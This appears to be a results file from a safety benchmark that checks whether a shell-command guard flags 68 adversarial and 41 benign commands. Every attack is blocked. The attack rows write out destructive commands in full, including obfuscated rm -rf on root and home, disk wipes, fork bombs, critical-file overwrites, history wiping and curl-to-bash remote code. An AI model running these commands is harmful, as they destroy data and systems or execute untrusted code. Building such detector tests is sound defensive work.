@@ -1,0 +1,1381 @@
+{
+  "layers": "both",
+  "sagecli_version": "0.1.0",
+  "python": "3.12.3",
+  "platform": "Linux-6.8.0-101-generic-x86_64-with-glibc2.39",
+  "generated_at": "2026-10-08T12:00:41+00:00",
+  "attacks": 68,
+  "benign": 41,
+  "attacks_flagged": 68,
+  "attacks_blocked": 68,
+  "attack_flag_rate": 1.0,
+  "attack_block_rate": 1.0,
+  "benign_flagged": 7,
+  "benign_blocked": 0,
+  "benign_flag_rate": 0.1707,
+  "benign_block_rate": 0.0,
+  "per_technique": {
+    "combined_obfuscation": {
+      "total": 5,
+      "flagged": 5,
+      "blocked": 5,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "critical_file": {
+      "total": 4,
+      "flagged": 4,
+      "blocked": 4,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "disk_alt_device": {
+      "total": 9,
+      "flagged": 9,
+      "blocked": 9,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "find_destructive": {
+      "total": 3,
+      "flagged": 3,
+      "blocked": 3,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "fork_bomb": {
+      "total": 2,
+      "flagged": 2,
+      "blocked": 2,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "history_wipe": {
+      "total": 2,
+      "flagged": 2,
+      "blocked": 2,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "interpreter_delete": {
+      "total": 3,
+      "flagged": 3,
+      "blocked": 3,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "perm_system_path": {
+      "total": 4,
+      "flagged": 4,
+      "blocked": 4,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "power": {
+      "total": 4,
+      "flagged": 4,
+      "blocked": 4,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "process_kill": {
+      "total": 3,
+      "flagged": 3,
+      "blocked": 3,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "remote_code": {
+      "total": 3,
+      "flagged": 3,
+      "blocked": 3,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_capital_r": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_flags_after_target": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_flags_reordered": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_long_options": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_no_preserve_root": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_split_flags": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_dot": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_double_slash": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_glob": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_home_braced": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_home_quoted": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_home_var": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_parent_walk": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_pwd_parent": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_substitution": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_system_dir": {
+      "total": 3,
+      "flagged": 3,
+      "blocked": 3,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "rm_target_tilde_glob": {
+      "total": 1,
+      "flagged": 1,
+      "blocked": 1,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "target_in_variable": {
+      "total": 4,
+      "flagged": 4,
+      "blocked": 4,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    },
+    "xargs_separated": {
+      "total": 3,
+      "flagged": 3,
+      "blocked": 3,
+      "flag_rate": 1.0,
+      "block_rate": 1.0
+    }
+  },
+  "attacks_not_blocked": [],
+  "benign_flagged_rows": [
+    {
+      "id": "v2-0069",
+      "technique": "benign",
+      "command": "rm -rf ./build",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0070",
+      "technique": "benign",
+      "command": "rm -rf node_modules",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0071",
+      "technique": "benign",
+      "command": "rm -rf /tmp/mydir",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0073",
+      "technique": "benign",
+      "command": "rm -r build/",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0074",
+      "technique": "benign",
+      "command": "rm -rf \"$HOME/.cache/pip\"",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0077",
+      "technique": "benign",
+      "command": "mkfs.ext4 ./disk.img",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "mkfs"
+      ]
+    },
+    {
+      "id": "v2-0082",
+      "technique": "benign",
+      "command": "find . -name '*.o' -delete",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "find_delete"
+      ]
+    }
+  ],
+  "results": [
+    {
+      "id": "v2-0001",
+      "technique": "rm_long_options",
+      "command": "rm --recursive --force /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0002",
+      "technique": "rm_split_flags",
+      "command": "rm -r -f /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0003",
+      "technique": "rm_flags_reordered",
+      "command": "rm -fr /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0004",
+      "technique": "rm_capital_r",
+      "command": "rm -Rf /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0005",
+      "technique": "rm_flags_after_target",
+      "command": "rm / -rf",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0006",
+      "technique": "rm_no_preserve_root",
+      "command": "rm -rf --no-preserve-root /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_no_preserve_root",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0007",
+      "technique": "rm_target_dot",
+      "command": "rm -rf /.",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0008",
+      "technique": "rm_target_double_slash",
+      "command": "rm -rf //",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0009",
+      "technique": "rm_target_parent_walk",
+      "command": "rm -rf /tmp/..",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0010",
+      "technique": "rm_target_glob",
+      "command": "rm -rf /*",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0011",
+      "technique": "rm_target_home_var",
+      "command": "rm -rf $HOME",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0012",
+      "technique": "rm_target_home_braced",
+      "command": "rm -rf ${HOME}",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0013",
+      "technique": "rm_target_home_quoted",
+      "command": "rm -rf \"$HOME\"",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0014",
+      "technique": "rm_target_tilde_glob",
+      "command": "rm -rf ~/*",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0015",
+      "technique": "rm_target_system_dir",
+      "command": "rm -rf /etc",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0016",
+      "technique": "rm_target_system_dir",
+      "command": "rm -rf /usr",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0017",
+      "technique": "rm_target_system_dir",
+      "command": "rm -rf /var/lib",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0018",
+      "technique": "rm_target_substitution",
+      "command": "rm -rf $(echo /)",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0019",
+      "technique": "rm_target_pwd_parent",
+      "command": "rm -rf $(pwd)/..",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0020",
+      "technique": "target_in_variable",
+      "command": "T=/; rm -rf $T",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0021",
+      "technique": "target_in_variable",
+      "command": "T=/; rm -rf \"$T\"",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0022",
+      "technique": "target_in_variable",
+      "command": "d=/dev/sda; dd if=/dev/zero of=$d",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "dd_to_device"
+      ]
+    },
+    {
+      "id": "v2-0023",
+      "technique": "target_in_variable",
+      "command": "d=/dev/sda; mkfs.ext4 $d",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "mkfs_device",
+        "mkfs"
+      ]
+    },
+    {
+      "id": "v2-0024",
+      "technique": "combined_obfuscation",
+      "command": "r\"\"m -rf $HOME",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0025",
+      "technique": "combined_obfuscation",
+      "command": "r''m -r -f /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0026",
+      "technique": "combined_obfuscation",
+      "command": "\\rm --recursive --force /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0027",
+      "technique": "combined_obfuscation",
+      "command": "bash -c \"rm -rf $HOME\"",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0028",
+      "technique": "combined_obfuscation",
+      "command": "eval 'rm -rf ${HOME}'",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "eval",
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0029",
+      "technique": "disk_alt_device",
+      "command": "dd if=/dev/zero of=/dev/nvme0n1",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "dd_to_device"
+      ]
+    },
+    {
+      "id": "v2-0030",
+      "technique": "disk_alt_device",
+      "command": "dd if=/dev/urandom of=/dev/sdb bs=1M",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "dd_to_device"
+      ]
+    },
+    {
+      "id": "v2-0031",
+      "technique": "disk_alt_device",
+      "command": "dd of=/dev/sda if=/dev/zero",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "dd_to_device"
+      ]
+    },
+    {
+      "id": "v2-0032",
+      "technique": "disk_alt_device",
+      "command": "mkfs -t ext4 /dev/sda1",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "mkfs_device",
+        "mkfs"
+      ]
+    },
+    {
+      "id": "v2-0033",
+      "technique": "disk_alt_device",
+      "command": "mkfs.xfs -f /dev/sdb",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "mkfs_device",
+        "mkfs"
+      ]
+    },
+    {
+      "id": "v2-0034",
+      "technique": "disk_alt_device",
+      "command": "wipefs -a /dev/sda",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "wipefs"
+      ]
+    },
+    {
+      "id": "v2-0035",
+      "technique": "disk_alt_device",
+      "command": "shred -vfz -n 3 /dev/sda",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "shred_device",
+        "shred"
+      ]
+    },
+    {
+      "id": "v2-0036",
+      "technique": "disk_alt_device",
+      "command": "cat /dev/urandom > /dev/sda",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "redirect_to_block_device",
+        "redirect_to_critical_file"
+      ]
+    },
+    {
+      "id": "v2-0037",
+      "technique": "disk_alt_device",
+      "command": "echo x | tee /dev/sda",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "write_to_block_device"
+      ]
+    },
+    {
+      "id": "v2-0038",
+      "technique": "perm_system_path",
+      "command": "chmod -R 000 /etc",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "recursive_perm_system",
+        "perm_system_root"
+      ]
+    },
+    {
+      "id": "v2-0039",
+      "technique": "perm_system_path",
+      "command": "chmod -R 777 /usr",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "recursive_perm_system",
+        "perm_system_root"
+      ]
+    },
+    {
+      "id": "v2-0040",
+      "technique": "perm_system_path",
+      "command": "chown -R nobody /",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "recursive_perm_system",
+        "perm_system_root"
+      ]
+    },
+    {
+      "id": "v2-0041",
+      "technique": "perm_system_path",
+      "command": "chown -R nobody:nobody /etc",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "recursive_perm_system",
+        "perm_system_root"
+      ]
+    },
+    {
+      "id": "v2-0042",
+      "technique": "find_destructive",
+      "command": "find / -type f -delete",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "find_delete_dangerous_root",
+        "find_delete"
+      ]
+    },
+    {
+      "id": "v2-0043",
+      "technique": "find_destructive",
+      "command": "find ~ -delete",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "find_delete_dangerous_root",
+        "find_delete"
+      ]
+    },
+    {
+      "id": "v2-0044",
+      "technique": "find_destructive",
+      "command": "find / -name '*' -exec rm -f {} \\;",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "find_delete_dangerous_root",
+        "find_delete"
+      ]
+    },
+    {
+      "id": "v2-0045",
+      "technique": "xargs_separated",
+      "command": "ls / | xargs rm -rf",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0046",
+      "technique": "xargs_separated",
+      "command": "echo /dev/sda | xargs shred",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "shred",
+        "shred_device"
+      ]
+    },
+    {
+      "id": "v2-0047",
+      "technique": "xargs_separated",
+      "command": "printf '%s\\n' / | xargs -I{} rm -rf {}",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "rm_recursive",
+        "rm_recursive_dangerous_target"
+      ]
+    },
+    {
+      "id": "v2-0048",
+      "technique": "remote_code",
+      "command": "curl -fsSL http://example.com/i.sh | bash",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "remote_pipe_shell"
+      ]
+    },
+    {
+      "id": "v2-0049",
+      "technique": "remote_code",
+      "command": "wget -O- http://example.com/i.sh | sudo sh",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "privilege_escalation",
+        "remote_pipe_shell"
+      ]
+    },
+    {
+      "id": "v2-0050",
+      "technique": "remote_code",
+      "command": "bash <(curl -s http://example.com/i.sh)",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "remote_code_exec"
+      ]
+    },
+    {
+      "id": "v2-0051",
+      "technique": "interpreter_delete",
+      "command": "python3 -c 'import os; os.system(\"rm -rf /\")'",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "interpreter_exec",
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0052",
+      "technique": "interpreter_delete",
+      "command": "perl -e 'system(\"rm -rf $ENV{HOME}\")'",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "interpreter_exec",
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0053",
+      "technique": "interpreter_delete",
+      "command": "ruby -e 'system(\"rm -rf /\")'",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "interpreter_exec",
+        "rm_recursive_dangerous_target",
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0054",
+      "technique": "critical_file",
+      "command": "echo > /etc/passwd",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "redirect_to_critical_file"
+      ]
+    },
+    {
+      "id": "v2-0055",
+      "technique": "critical_file",
+      "command": "truncate -s 0 /etc/shadow",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "modify_critical_file"
+      ]
+    },
+    {
+      "id": "v2-0056",
+      "technique": "critical_file",
+      "command": "mv /etc/passwd /tmp/p",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "modify_critical_file"
+      ]
+    },
+    {
+      "id": "v2-0057",
+      "technique": "critical_file",
+      "command": "cat /dev/null > /boot/vmlinuz",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "redirect_to_critical_file"
+      ]
+    },
+    {
+      "id": "v2-0058",
+      "technique": "history_wipe",
+      "command": "history -c; rm -f ~/.bash_history",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "history_clear",
+        "delete_history_or_log"
+      ]
+    },
+    {
+      "id": "v2-0059",
+      "technique": "history_wipe",
+      "command": "shred -u ~/.bash_history",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "shred",
+        "delete_history_or_log"
+      ]
+    },
+    {
+      "id": "v2-0060",
+      "technique": "fork_bomb",
+      "command": ":(){ :|:& };:",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "fork_bomb"
+      ]
+    },
+    {
+      "id": "v2-0061",
+      "technique": "fork_bomb",
+      "command": "bomb() { bomb | bomb & }; bomb",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "fork_bomb"
+      ]
+    },
+    {
+      "id": "v2-0062",
+      "technique": "process_kill",
+      "command": "kill -9 -1",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "kill_init_or_all"
+      ]
+    },
+    {
+      "id": "v2-0063",
+      "technique": "process_kill",
+      "command": "killall -9 sshd",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "kill_critical_process",
+        "mass_kill"
+      ]
+    },
+    {
+      "id": "v2-0064",
+      "technique": "process_kill",
+      "command": "pkill -9 -u root",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "kill_critical_process",
+        "mass_kill"
+      ]
+    },
+    {
+      "id": "v2-0065",
+      "technique": "power",
+      "command": "reboot",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "shutdown_reboot"
+      ]
+    },
+    {
+      "id": "v2-0066",
+      "technique": "power",
+      "command": "poweroff -f",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "shutdown_reboot"
+      ]
+    },
+    {
+      "id": "v2-0067",
+      "technique": "power",
+      "command": "systemctl poweroff",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "systemctl_power"
+      ]
+    },
+    {
+      "id": "v2-0068",
+      "technique": "power",
+      "command": "init 0",
+      "should_block": true,
+      "verdict": "BLOCK",
+      "rules": [
+        "init_runlevel"
+      ]
+    },
+    {
+      "id": "v2-0069",
+      "technique": "benign",
+      "command": "rm -rf ./build",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0070",
+      "technique": "benign",
+      "command": "rm -rf node_modules",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0071",
+      "technique": "benign",
+      "command": "rm -rf /tmp/mydir",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0072",
+      "technique": "benign",
+      "command": "rm -f *.log",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0073",
+      "technique": "benign",
+      "command": "rm -r build/",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0074",
+      "technique": "benign",
+      "command": "rm -rf \"$HOME/.cache/pip\"",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "rm_recursive"
+      ]
+    },
+    {
+      "id": "v2-0075",
+      "technique": "benign",
+      "command": "dd if=/dev/zero of=./test.img bs=1M count=10",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0076",
+      "technique": "benign",
+      "command": "dd if=input.iso of=output.iso",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0077",
+      "technique": "benign",
+      "command": "mkfs.ext4 ./disk.img",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "mkfs"
+      ]
+    },
+    {
+      "id": "v2-0078",
+      "technique": "benign",
+      "command": "truncate -s 10M sparse.img",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0079",
+      "technique": "benign",
+      "command": "chmod -R 755 ./site",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0080",
+      "technique": "benign",
+      "command": "chmod 600 ~/.ssh/id_rsa",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0081",
+      "technique": "benign",
+      "command": "chown -R $USER ./project",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0082",
+      "technique": "benign",
+      "command": "find . -name '*.o' -delete",
+      "should_block": false,
+      "verdict": "WARN",
+      "rules": [
+        "find_delete"
+      ]
+    },
+    {
+      "id": "v2-0083",
+      "technique": "benign",
+      "command": "find /var/log -name '*.gz' -type f",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0084",
+      "technique": "benign",
+      "command": "find . -type f -name '*.bak'",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0085",
+      "technique": "benign",
+      "command": "ls | xargs wc -l",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0086",
+      "technique": "benign",
+      "command": "echo a b | xargs echo",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0087",
+      "technique": "benign",
+      "command": "kill -9 4321",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0088",
+      "technique": "benign",
+      "command": "kill -TERM 999",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0089",
+      "technique": "benign",
+      "command": "pkill -f myscript",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0090",
+      "technique": "benign",
+      "command": "systemctl status ssh",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0091",
+      "technique": "benign",
+      "command": "history | tail -n 5",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0092",
+      "technique": "benign",
+      "command": "cat ~/.bash_history | grep ssh",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0093",
+      "technique": "benign",
+      "command": "cat /etc/os-release",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0094",
+      "technique": "benign",
+      "command": "ls -l /etc/passwd",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0095",
+      "technique": "benign",
+      "command": "stat /etc/shadow",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0096",
+      "technique": "benign",
+      "command": "ls /boot",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0097",
+      "technique": "benign",
+      "command": "df -h /dev/sda1",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0098",
+      "technique": "benign",
+      "command": "lsblk",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0099",
+      "technique": "benign",
+      "command": "fdisk -l",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0100",
+      "technique": "benign",
+      "command": "curl -fsSL http://example.com/i.sh -o i.sh",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0101",
+      "technique": "benign",
+      "command": "wget http://example.com/file.tar.gz",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0102",
+      "technique": "benign",
+      "command": "python3 -c 'print(1 + 1)'",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0103",
+      "technique": "benign",
+      "command": "perl -e 'print \"hi\\n\"'",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0104",
+      "technique": "benign",
+      "command": "echo \"reboot\"",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0105",
+      "technique": "benign",
+      "command": "echo 'rm -rf /' | cat",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0106",
+      "technique": "benign",
+      "command": "grep -rn \"mkfs\" docs/",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0107",
+      "technique": "benign",
+      "command": "man shutdown",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0108",
+      "technique": "benign",
+      "command": "cp /etc/hostname ./hostname.bak",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    },
+    {
+      "id": "v2-0109",
+      "technique": "benign",
+      "command": "tar -tzf backup.tar.gz",
+      "should_block": false,
+      "verdict": "SAFE",
+      "rules": []
+    }
+  ],
+  "data": "adversarial_v2.jsonl"
+}
